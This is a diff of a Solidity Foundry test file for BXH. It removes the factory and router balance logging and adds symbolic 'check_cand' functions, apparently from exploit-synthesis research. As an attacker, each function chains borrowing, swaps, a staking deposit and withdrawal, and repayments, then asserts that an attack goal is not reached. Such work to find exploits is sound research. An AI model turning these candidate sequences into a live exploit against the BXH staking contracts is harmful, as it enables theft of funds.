@@ -117,30 +117,6 @@ contract BXHTest is Test, BlockLoader {
         );
         queryERC20BalanceDecimals(address(bxh), address(pair), bxh.decimals());
         emit log_string("");
-        emit log_string("Factory Balances: ");
-        queryERC20BalanceDecimals(
-            address(usdt),
-            address(factory),
-            usdt.decimals()
-        );
-        queryERC20BalanceDecimals(
-            address(bxh),
-            address(factory),
-            bxh.decimals()
-        );
-        emit log_string("");
-        emit log_string("Router Balances: ");
-        queryERC20BalanceDecimals(
-            address(usdt),
-            address(router),
-            usdt.decimals()
-        );
-        queryERC20BalanceDecimals(
-            address(bxh),
-            address(router),
-            bxh.decimals()
-        );
-        emit log_string("");
         emit log_string("Bxhstaking Balances: ");
         queryERC20BalanceDecimals(
             address(usdt),
@@ -298,6 +274,98 @@ contract BXHTest is Test, BlockLoader {
     }
 
     function check_cand003(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        vm.assume(amt6 >= amt4);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bxh(amt1, amt2);
+        deposit_bxhstaking_bxh_bxhslp(amt3);
+        borrow_usdt_pair(amt4);
+        withdraw_bxhstaking_bxhslp_usdt(amt5);
+        payback_usdt_pair(amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand004(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        vm.assume(amt6 >= amt4);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bxh(amt1, amt2);
+        deposit_bxhstaking_bxh_bxhslp(amt3);
+        borrow_bxh_pair(amt4);
+        withdraw_bxhstaking_bxhslp_usdt(amt5);
+        payback_bxh_pair(amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand005(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bxh(amt1, amt2);
+        deposit_bxhstaking_bxh_bxhslp(amt3);
+        swap_pair_attacker_usdt_bxh(amt4, amt5);
+        withdraw_bxhstaking_bxhslp_usdt(amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand006(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bxh(amt1, amt2);
+        deposit_bxhstaking_bxh_bxhslp(amt3);
+        swap_pair_attacker_bxh_usdt(amt4, amt5);
+        withdraw_bxhstaking_bxhslp_usdt(amt6);
+        payback_usdt_owner(amt7);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand007(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
